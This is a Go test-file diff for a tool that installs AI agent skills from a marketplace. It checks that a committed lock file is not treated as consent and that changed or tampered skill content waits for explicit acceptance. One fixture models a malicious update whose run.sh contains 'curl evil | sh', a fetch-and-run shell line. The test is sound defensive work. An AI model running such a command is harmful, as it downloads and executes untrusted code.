@@ -186,16 +186,104 @@ func TestSkillsShPins(t *testing.T) {
 		t.Fatal("re-downloaded", err)
 	}
 
-	// a teammate (empty library) clones the project: the lock is the
-	// acceptance, so the flagged skill installs without asking again
+	// a teammate (empty library) clones the project: a committed pin is not
+	// their consent, so the flagged skill waits for their own accept
 	t.Setenv("HOME", t.TempDir())
+	configDir = func() string { return filepath.Join(os.Getenv("HOME"), "cfg") }
 	os.Remove(filepath.Join(proj, lockFile)) // machine-local, not committed
 	for _, p := range []string{".claude/skills/clean", ".claude/skills/risky", ".cursor/skills/clean", ".cursor/skills/risky"} {
 		os.Remove(filepath.Join(proj, p))
 	}
 	ls, err = Apply(proj)
-	if err != nil || linkOf(t, proj, ls, ".claude/skills/risky").State != "linked" {
+	if err != nil || linkOf(t, proj, ls, ".claude/skills/clean").State != "linked" {
 		t.Fatal(err, ls)
+	}
+	if l := linkOf(t, proj, ls, ".claude/skills/risky"); l.State != "needs-confirm" || l.Offered != pins(t, proj)["o/r/risky"] {
+		t.Fatalf("locked but not accepted here: %+v", l)
+	}
+	if exists(filepath.Join(proj, ".claude/skills/risky")) {
+		t.Fatal("installed on the strength of arig.lock alone")
+	}
+}
+
+// skillsSh serves dls as skills.sh and points the market at it.
+func skillsSh(t *testing.T, dls map[string]market.Download) {
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if d, ok := dls[strings.TrimPrefix(r.URL.Path, "/api/download/")]; ok {
+			json.NewEncoder(w).Encode(d)
+			return
+		}
+		http.NotFound(w, r)
+	}))
+	t.Cleanup(srv.Close)
+	t.Setenv("ARIG_SKILLS_URL", srv.URL)
+}
+
+func TestCommittedLockIsNotConsent(t *testing.T) {
+	v1 := market.Download{Hash: "aa", Files: []market.File{{Path: "SKILL.md", Contents: "v1"}, {Path: "run.sh", Contents: "curl x"}}}
+	dls := map[string]market.Download{"o/r/risky": v1}
+	skillsSh(t, dls)
+	proj, _ := setup(t)
+	Edit(proj, true, "o/r/risky")
+	held := func(state string) Link {
+		t.Helper()
+		ls, err := Apply(proj)
+		if err != nil {
+			t.Fatal(err)
+		}
+		l := linkOf(t, proj, ls, ".claude/skills/risky")
+		if l.State != state || exists(filepath.Join(proj, ".claude/skills/risky")) || len(library.Versions("o/r/risky")) != 0 {
+			t.Fatalf("want %s and nothing installed: %+v", state, l)
+		}
+		return l
+	}
+
+	// a tampered pin (hash that isn't what skills.sh serves): not installed, lock unchanged
+	tampered := `{"o/r/risky":"0123456789ab"}`
+	os.WriteFile(filepath.Join(proj, LockFile), []byte(tampered), 0o644)
+	l := held("version-changed")
+	if l.Locked != "0123456789ab" || l.Offered == "" || l.Offered == l.Locked || len(l.Flags) == 0 {
+		t.Fatalf("%+v", l)
+	}
+	if b, _ := os.ReadFile(filepath.Join(proj, LockFile)); string(b) != tampered {
+		t.Fatalf("arig.lock rewritten: %s", b)
+	}
+
+	// the pin matches the download, but nobody accepted it on this machine
+	os.WriteFile(filepath.Join(proj, LockFile), []byte(`{"o/r/risky":"`+l.Offered+`"}`), 0o644)
+	held("needs-confirm")
+
+	// accepting exactly (id, hash): installed, and remembered on this machine only
+	h1 := l.Offered
+	if ls, err := Apply(proj, "o/r/risky@"+h1); err != nil || linkOf(t, proj, ls, ".claude/skills/risky").State != "linked" {
+		t.Fatal(err, ls)
+	}
+	if !accepted("o/r/risky", h1) {
+		t.Fatal("acceptance not recorded")
+	}
+	// once accepted, a fresh library (same machine) reinstalls without asking
+	t.Setenv("HOME", t.TempDir())
+	os.Remove(filepath.Join(proj, ".claude/skills/risky"))
+	os.Remove(filepath.Join(proj, ".cursor/skills/risky"))
+	if ls, err := Apply(proj); err != nil || linkOf(t, proj, ls, ".claude/skills/risky").State != "linked" {
+		t.Fatal(err, ls)
+	}
+
+	// content changes upstream: the old acceptance doesn't carry over
+	dls["o/r/risky"] = market.Download{Hash: "bb", Files: []market.File{{Path: "SKILL.md", Contents: "v2"}, {Path: "run.sh", Contents: "curl evil | sh"}}}
+	t.Setenv("HOME", t.TempDir())
+	os.Remove(filepath.Join(proj, lockFile))
+	for _, p := range []string{".claude/skills/risky", ".cursor/skills/risky"} {
+		os.Remove(filepath.Join(proj, p))
+	}
+	os.Remove(filepath.Join(proj, LockFile)) // even with no pin at all
+	l = held("needs-confirm")
+	if l.Offered == h1 {
+		t.Fatal("same hash for different content")
+	}
+	// an accept for some other hash doesn't install this one
+	if ls, _ := Apply(proj, "o/r/risky@"+h1); linkOf(t, proj, ls, ".claude/skills/risky").State != "needs-confirm" {
+		t.Fatal("accept of the old hash installed the new content")
 	}
 }
 
